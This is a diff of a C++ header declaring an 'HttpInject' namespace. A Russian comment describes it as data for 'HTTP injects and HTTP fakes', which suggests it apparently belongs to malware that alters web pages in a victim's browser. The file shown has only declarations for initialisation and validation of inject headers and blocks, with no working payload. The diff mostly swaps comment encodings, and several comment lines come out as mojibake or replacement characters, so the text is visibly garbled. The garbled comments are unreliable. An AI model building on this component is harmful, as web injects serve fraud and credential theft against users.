@@ -1,11 +1,11 @@
 /*
-  �������� ����� ��� HTTP-�������� � HTTP-������.
+  Некотрые данне для HTTP-инжектов и HTTP-фейков.
 */
 #pragma once
 
 namespace HttpInject
 {
-  //Флаги HEADER.flags.
+  //Р¤Р»Р°РіРё HEADER.flags.
 
   enum
   {
@@ -47,32 +47,32 @@ namespace HttpInject
 # pragma pack(pop)
 
   /*
-    �������������.
+    Инициализация.
   */
   void init(void);
 
   /*
-    ���������������.
+    Деинициализация.
   */
   void uninit(void);
 
   /*
-    �������� ������������ �������� � HEADER.
+    Проверка корректности оффсетов в HEADER.
 
     IN header - HEADER.
 
-    Return    - true - ���������,
-                false - �� ���������.
+    Return    - true - корректно,
+                false - не корректно.
   */
   bool _isCorrectHeader(const HEADER *header);
 
-  /*    Validating set INJECTBLOCK.
+  /*В В В В Validating set INJECTBLOCK.
 
-    IN block - set INJECTBLOCK.
-    IN size - the size of the set.
+В В В В IN block - set INJECTBLOCK.
+В В В В IN size - the size of the set.
 
-    Return - true - well,
-                false - is not correct.
-  */
+В В В В Return - true - well,
+В В В В В В В В В В В В В В В В false - is not correct.
+В В */
   bool _isCorrectBlockList(const INJECTBLOCK *block, DWORD size);
 };
